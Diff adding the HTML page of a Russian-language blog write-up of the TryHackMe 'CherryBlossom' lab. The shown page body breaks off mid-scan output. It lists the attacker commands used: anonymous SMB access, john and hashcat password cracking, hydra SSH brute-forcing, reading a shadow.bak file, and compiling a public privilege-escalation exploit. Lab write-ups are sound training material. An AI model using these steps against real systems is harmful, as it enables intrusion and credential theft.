@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Tryhackme — CherryBlossom (Hard) | .bdk writeups</title>
+<meta name="keywords" content="Linux">
+<meta name="description" content="В этот раз мы рассмотрим комнату на THM под названием CherryBlossom. Её автор MuirlandOracle. Вообще, за его авторством на этой платформе есть несколько комнат. Например, я проходил одну теоретическую на тему эксплуатации уязвимости, связанной с загрузкой файлов в веб-приложениях.
+Первым делом, после запуска машины, нужно разведать обстановку. Для меня привычным делом является использование nmap, потому что сканирование портов зачастую даёт много полезной информации, или хотя бы ту часть информации, которая позволяет хоть от чего-то оттолкнуться.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/cherryblossom/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.a8f34a37fb3975a00582a122460dbac60d7e4ab589171590c071eace46966a22.css" integrity="sha256-qPNKN/s5daAFgqEiRg26xg1&#43;SrWJFxWQwHHqzkaWaiI=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/cherryblossom/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/posts/cherryblossom/">
+  <meta property="og:site_name" content=".bdk writeups">
+  <meta property="og:title" content="Tryhackme — CherryBlossom (Hard)">
+  <meta property="og:description" content="В этот раз мы рассмотрим комнату на THM под названием CherryBlossom. Её автор MuirlandOracle. Вообще, за его авторством на этой платформе есть несколько комнат. Например, я проходил одну теоретическую на тему эксплуатации уязвимости, связанной с загрузкой файлов в веб-приложениях.
+Первым делом, после запуска машины, нужно разведать обстановку. Для меня привычным делом является использование nmap, потому что сканирование портов зачастую даёт много полезной информации, или хотя бы ту часть информации, которая позволяет хоть от чего-то оттолкнуться.">
+  <meta property="og:locale" content="ru_ru">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-06-21T15:29:04+07:00">
+    <meta property="article:modified_time" content="2026-06-21T15:29:04+07:00">
+    <meta property="article:tag" content="Linux">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Tryhackme — CherryBlossom (Hard)">
+  <meta name="twitter:description" content="В этот раз мы рассмотрим комнату на THM под названием CherryBlossom. Её автор MuirlandOracle. Вообще, за его авторством на этой платформе есть несколько комнат. Например, я проходил одну теоретическую на тему эксплуатации уязвимости, связанной с загрузкой файлов в веб-приложениях.
+Первым делом, после запуска машины, нужно разведать обстановку. Для меня привычным делом является использование nmap, потому что сканирование портов зачастую даёт много полезной информации, или хотя бы ту часть информации, которая позволяет хоть от чего-то оттолкнуться.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Tryhackme — CherryBlossom (Hard)",
+      "item": "http://localhost:1313/posts/cherryblossom/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Tryhackme — CherryBlossom (Hard)",
+  "name": "Tryhackme — CherryBlossom (Hard)",
+  "description": "В этот раз мы рассмотрим комнату на THM под названием CherryBlossom. Её автор MuirlandOracle. Вообще, за его авторством на этой платформе есть несколько комнат. Например, я проходил одну теоретическую на тему эксплуатации уязвимости, связанной с загрузкой файлов в веб-приложениях.\nПервым делом, после запуска машины, нужно разведать обстановку. Для меня привычным делом является использование nmap, потому что сканирование портов зачастую даёт много полезной информации, или хотя бы ту часть информации, которая позволяет хоть от чего-то оттолкнуться.\n",
+  "keywords": [
+    "Linux"
+  ],
+  "articleBody": "В этот раз мы рассмотрим комнату на THM под названием CherryBlossom. Её автор MuirlandOracle. Вообще, за его авторством на этой платформе есть несколько комнат. Например, я проходил одну теоретическую на тему эксплуатации уязвимости, связанной с загрузкой файлов в веб-приложениях.\nПервым делом, после запуска машины, нужно разведать обстановку. Для меня привычным делом является использование nmap, потому что сканирование портов зачастую даёт много полезной информации, или хотя бы ту часть информации, которая позволяет хоть от чего-то оттолкнуться.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 $ nmap -sS -sC -p- 10.113.182.130 Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-01 05:00 -0400 Nmap scan report for 10.113.182.130 Host is up (0.091s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh | ssh-hostkey: | 2048 21:ee:30:4f:f8:f7:9f:32:6e:42:95:f2:1a:1a:04:d3 (RSA) | 256 dc:fc:de:d6:ec:43:61:00:54:9b:7c:40:1e:8f:52:c4 (ECDSA) |_ 256 12:81:25:6e:08:64:f6:ef:f5:0c:58:71:18:38:a5:c6 (ED25519) 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required |_nbstat: NetBIOS name: UBUNTU, NetBIOS user: , NetBIOS MAC: (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: cherryblossom | NetBIOS computer name: UBUNTU\\x00 | Domain name: \\x00 | FQDN: cherryblossom |_ System time: 2026-07-01T10:04:05+01:00 | smb2-time: | date: 2026-07-01T09:04:05 |_ start_date: N/A |_clock-skew: mean: -19m58s, deviation: 34m37s, median: 0s Nmap done: 1 IP address (1 host up) scanned in 220.76 seconds Получилось выудить много полезной информации. Начнем с того, что у нас есть 445 порт, на котором висит SMB. Но, так как я запустил nmap с флагом -sc, вдобавок ко всему этому мы видим, что есть возможность анонимного доступа (account_used: guest). То есть, мы можем просмотреть список доступных шар, и даже подключиться к какой-нибудь шаре. Для этого используем smbclient.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ smbclient -L //10.113.182.130/ -N Anonymous login successful Sharename Type Comment --------- ---- ------- Anonymous Disk Anonymous File Server Share IPC$ IPC IPC Service (Samba 4.7.6-Ubuntu) Reconnecting with SMB1 for workgroup listing. Anonymous login successful Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP UBUNTU Как видим, старый nmap нам не наврал, возможность анонимного подключения к SMB действительно существует. Больше всего нас здесь интересует шара под манящим названием Anonuymous. Мы присоединимся к ней и посмотрим, что же она скрывает.\n1 2 3 4 5 6 7 8 9 10 11 $ smbclient //10.113.182.130/Anonymous -N Anonymous login successful Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Sun Feb 9 19:22:51 2020 .. D 0 Sun Feb 9 12:48:18 2020 journal.txt N 3470998 Sun Feb 9 19:20:53 2020 10253588 blocks of size 1024. 4680100 blocks available smb: \\\u003e get journal.txt getting file \\journal.txt of size 3470998 as journal.txt (1179.4 KiloBytes/sec) (average 1179.4 KiloBytes/sec) После подключения к шаре Anonymous я нашёл файл с говорящим названием, который сразу же забрал к себе на комп. Если вам интересно содержимое этого файла точно также, как и мне, то спешу вас разочаровать, оно закодировано.\nМы видим здесь кодировку base64. Думаю, для начала стоит попробовать все это привести к “человеческому” виду, прибегнув к использованию утилиты base64.\n1 $ cat journal.txt | base64 -d \u003e result После декодирования содержимого файла к “человеческому” виду прийти не удалось, но самое главное, что содержимое все-таки было декодировано. Учитывая, что автор явно пытается что-то спрятать, я для начала решил проверить, что из себя вообще представляет получившийся в ходе декодирования файл, и получил предсказуемый вывод.\n1 2 $ file result result: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced Получившийся декодированный файл является изображением формата PNG. А это значит, что нам предстоит столкнуться со стеганографией. Кстати, если вам вдруг интересно, то картинка там следующего характера.\nДля того, чтобы разгадать секрет картинки, существует много стеганографических тулов. Я решил воспользоваться stegpy. И мне даже удалось кое-что добыть.\n1 2 $ stegpy result File _journal.zip succesfully extracted from result К сожалению, это была не последняя искрометная шутка автора комнаты, потому что архив поврежден.\n1 2 3 $ unzip _journal.zip Archive: _journal.zip file #1: bad zipfile offset (local header sig): 0 На самом деле, хорошо, когда в таких случаях до автоматизма доведена привычка использовать file, потому что он может сэкономить часы мозгового штурма.\n1 2 $ file _journal.zip _journal.zip: JPEG image data Конечно, фокус с изменением расширения файла не сработал. Перед нами на этот раз нет ни сакуры, ни самурая, но зато в ходе “упорного” мозгового штурма возникла другая идея. Раз уж это на самом деле не картинка, а вылезло это чудо изначально с расширением .zip, может, стоит попробовать поменять магическое число? Помочь с изменением того самого числа может hexedit, ну, а помнить его для .zip архива необязательно (но если помните, снимаю шляпу).\nВпереди было две новости, по классике, хорошая - это действительно .zip архив, и его теперь можно открыть, плохая - нужен так называемый passphrase.\n1 2 3 4 $ unzip _journal.zip Archive: _journal.zip [_journal.zip] Journal.ctz password: skipping: Journal.ctz incorrect password В этом деле я всегда обращаюсь к своему старому товарищу. В большинстве случаев для него это дело нескольких минут. Кто не понял, обратимся к john, а ещё точнее, к его дополнению zip2john.\n1 2 $ zip2john _journal.zip \u003e zip_hash.txt ver 2.0 efh 5455 efh 7875 _journal.zip/Journal.ctz PKZIP Encr: TS_chk, cmplen=70461, decmplen=70434, crc=0B987D84 ts=0035 cs=0035 type=8 Получившийся хэш кормим самому джону и через пару мгновений наблюдаем результат.\n1 2 3 4 5 6 7 8 9 $ john --wordlist=rockyou.txt zip_hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status [REDACTED] (_journal.zip/Journal.ctz) 1g 0:00:00:00 DONE (2026-07-01 06:39) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Как оно неудивительно, в этом архиве оказался другой архив.\n1 2 3 4 $ unzip _journal.zip Archive: _journal.zip [_journal.zip] Journal.ctz password: inflating: Journal.ctz Кстати, он тоже запаролен. В поисках информации я подался в ближайший браузер и обнаружил, что добытый мною архив является производной приложения Cherrytree. Как говорится, “у страха глаза велики”, потому как передо мной на самом деле оказался 7zip архив, это я понял после изучения информации и совета вновь заюзать file (помним про доведение до автоматизма? :\u003e).\n1 2 $ file Journal.ctz Journal.ctz: 7-zip archive data, version 0.4 Но! В этот раз поиграться с zip2john не выйдет. Но, как я узнал, у джона есть ещё один тул, как раз-таки направленный на 7z архивы. Вы даже не представляете как он называется! Не волнуйтесь, сообщаю: 7z2john. Синтаксис столь же прост, как и название чудо тула.\n1 2 $ 7z2john Journal.ctz \u003e 7z_hash.txt ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes Как видите, программа крайне настоятельно просит меня не раскрывать хэш. Поэтому последую её совету и ни в коем случае не буду этого делать (самые любознательные могут получить его в ходе прохождения этой комнаты на THM). Я же следую далее и вновь обращаюсь к своему товарищу (абсолютно безвозмездно) с просьбой разгадать passphrase. На этот раз времени ушло чуть больше.\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ john --wordlist=rockyou.txt 7z_hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES]) Cost 1 (iteration count) is 524288 for all loaded hashes Cost 2 (padding size) is 5 for all loaded hashes Cost 3 (compression type) is 2 for all loaded hashes Cost 4 (data length) is 70283 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status [REDACTED] (Journal.ctz) 1g 0:00:01:19 DONE (2026-07-01 06:55) 0.01264g/s 70.79p/s 70.79c/s 70.79C/s spartans..inferno Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Поспешим посмотреть содержимое. Открыть данный архив можно с помощью того самого приложеня Cherrytree, я вижу его, а тем-более пользуюсь им, впервые.\nВнутри было что-то вроде дневника: записки сумасшедшего. Вкратце: чувак съехал с катушек и его терапевт попросила его вести дневник, ведь это может ему помочь совладать с мыслями. Но мы опустим всю трагику этой истории и сосредоточимся на добыче. Первое: автор дневника пишет о том, что ему удалось собрать список паролей, которые никто и никогда не использовал до этого, и их невозможно будет взломать. Естественно, по доброте душевной он оставил список паролей в своём дневнике. Кроме того, в одной из записей он упомянул, что его подруга, lily, выбрала себе пароль. Имя у нас есть и список тоже есть. А ещё у нас есть ssh на 22 порту, вот вам и вектор атаки. Кстати, вторая новость: в этом дневнике был флаг.\nТак как у нас есть юзер, есть список, воспользуемся hydra для того, чтобы надыбать себе доступ к системе через ssh.\n1 2 3 4 5 $ hydra -l lily -P cherry-blossom.list ssh://10.113.182.130 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-01 07:14:58 [22][ssh] host: 10.113.182.130 login: lily password: [REDACTED] 1 of 1 target successfully completed, 1 valid password found После томного ожидания получаем пароль, а следовательно, и доступ к машине по ssh.\n1 2 3 4 5 6 7 8 $ ssh lily@10.113.182.130 ##################################### ########## Welcome, Lily ########## ##################################### lily@cherryblossom:~$ Изначально я пытался найти что-то полезное, осуществляя первоначальное перечисление системы: смотрел getcap, искал файлы с установленными SUID, пытался просмотреть sudo -l, но ничего дельного я не нашёл. Поэтому я принялся рыскать по системе, и, на моё, удивление, когда я пошёл по привычному для себя пути в директорию /var/backups, я обнаружил там .bak файлы для passwd и shadow. И я бы прошёл мимо, если бы не заметил, что могу читать shadow.bak.\n1 2 3 lily@cherryblossom:/var/backups$ ls -la -r--r--r-- 1 root shadow 1481 Feb 9 2020 shadow.bak Ещё изначально, когда я только осматривался в системе, в директории /home я заметил существование ещё одного пользователя: johan. Да, его хэш есть в том самом shadow.bak.\nНа этот раз я решил обратиться к ещё одному своему товарищу hashcat. Для него эта задача по плечу. Использовать я решил тот же список, что и для lily.\n1 $ hashcat -a0 -m1800 '[REDACTED_HASH]' cherry-blossom.list После получения пароля я залогинился за johan с помощью su в сессии за lily, затем решил сразу же проверить директорию /home/johan, где, как и следовало этого ожидать, нашёл файл user.txt, в котором был заветный флаг.\nКонечно, это ещё не все. Не просто так в системе существует root юзер, ведь и его флаг нам тоже нужен. Дальше я долго искал хоть какие-то зацепки, куда же двигаться дальше. Прошерудив доступные файлы для чтения для johan с помощью find, его разрешения и подобные первостепенные вещи, ничего из ряда вон выходящего и не обнаружил. Всё было также чисто, как и у lily. В голову даже лезла идея вскрыть хэш в том самом shadow.bak для рут юзера, но это занимает неизвестно сколько времени, поэтому от этой идея сразу отступился.\nЗатем я решил воспользоваться одним тулом, который сканирует систему и пытается найти, для каких экплойтов она уязвима. Если кто не в курсе, тул Linux Exploit Suggester. Тул мне показал несколько уязвимостей и даже дал ссылки на PoC для двух из них, именно поэтому на них я и сосредоточился.Я решил использовать PoC для уязвимости CVE-2021-3493.\nКстати, при попытке использовать данный экспойт я столкнулся с небольшой проблемой. Дело в том, что я, как обычно, скомпилировал .c файл с помощью gcc.\n1 gcc exploit.c -o file_1 Но я не задумывался о том, что атакуемая машина окажется слишком стара по сравнению с моей. Этот файл там просто не хотел запускаться. Поэтому пришлось повторно выполнить компиляцию, но с добавлением флага -static. После запуска эксплойта получилась следующая картина.\nКак видите, удалось добыть рут флаг.\nПримечание Как выяснилось позже, когда я ознакомился с райтапом самого автора, его задумка крылась в ином. На самом деле, по его задумке, нужно было воспользоваться другой уязвимостью, которую LSE мне точно также показал (именно между этой уязимостью и CVE-2021-3493 я и выбирал). Я остановился на CVE-2021-3493, потому что после того, как я прочитал информацию об этой уязвимости, и узнал, что её эксплуатация приводит к получению рут прав, я решил дальше не копать, и воспользоваться эксплойтом. Автор же подразумеваел в своей комнате эксплуатацию уязвимости CVE-2019-18634.\nДело в том, что при использовании sudo нужно привычным образом ввести пароль юзера. Но что непривычно, так это то, что в терминале вместо пустоты в ответ вводимым символам отображаются звездочки.\nЗа это отвечает опция pwfeedback. Под вводимый пользователем пароль в оперативной памяти выделяется фиксированная ячейка определенного размера (буфер). То есть, функция должна была строго следить за переполнением этой ячейки. Но нет худа без добра. Умельцы нашли способ сломать данную проверку.\nЛишние вводимые данные в поле пароля выходили за границы буфера и начинали затирать соседние участки памяти. И в самом конце всей этой истории находится важная структура: Return Address. Это указатель, который по окончании функции ввода пароля диктовал дальнейшие действия. И именно здесь злоумышленники использовали свой код для выполнения.\nВ целом, комната вышла достаточно интересной. Как я упомянал в начале, я знаком с работами этого автора на TryHackMe. Я надеюсь, что мои комментарии по ходу решения пришлись вам по душе, а самое главное, были предельно понятными. До новых встреч!\n",
+  "wordCount" : "2186",
+  "inLanguage": "en",
+  "datePublished": "2026-06-21T15:29:04+07:00",
+  "dateModified": "2026-06-21T15:29:04+07:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/posts/cherryblossom/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": ".bdk writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title=".bdk writeups (Alt + H)">.bdk writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Главная">
+                    <span>Главная</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/writeups/" title="Райтапы">
+                    <span>Райтапы</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/notes/" title="Заметки">
+                    <span>Заметки</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="Обо мне">
+                    <span>Обо мне</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Tryhackme — CherryBlossom (Hard)
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-06-21 15:29:04 +0700 +07'>21 июня 2026 г.</span>
+
+</div>
+  </header> 
+  <div class="post-content md-content"><p>В этот раз мы рассмотрим комнату на THM под названием <strong>CherryBlossom</strong>. Её автор <strong>MuirlandOracle</strong>. Вообще, за его авторством на этой платформе есть несколько комнат. Например, я проходил одну теоретическую на тему эксплуатации уязвимости, связанной с загрузкой файлов в веб-приложениях.</p>
+<p>Первым делом, после запуска машины, нужно разведать обстановку. Для меня привычным делом является использование nmap, потому что сканирование портов зачастую даёт много полезной информации, или хотя бы ту часть информации, которая позволяет хоть от чего-то оттолкнуться.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nmap -sS -sC -p- 10.113.182.130
+</span></span><span style="display:flex;"><span>Starting Nmap 7.99 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-07-01 05:00 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.113.182.130
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.091s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 21:ee:30:4f:f8:f7:9f:32:6e:42:95:f2:1a:1a:04:d3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> dc:fc:de:d6:ec:43:61:00:54:9b:7c:40:1e:8f:52:c4 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 12:81:25:6e:08:64:f6:ef:f5:0c:58:71:18:38:a5:c6 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3.1.1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb-os-discovery: 
+</span></span><span style="display:flex;"><span>|   OS: Windows 6.1 <span style="color:#f92672">(</span>Samba 4.7.6-Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Computer name: cherryblossom
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: UBUNTU<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Domain name: <span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
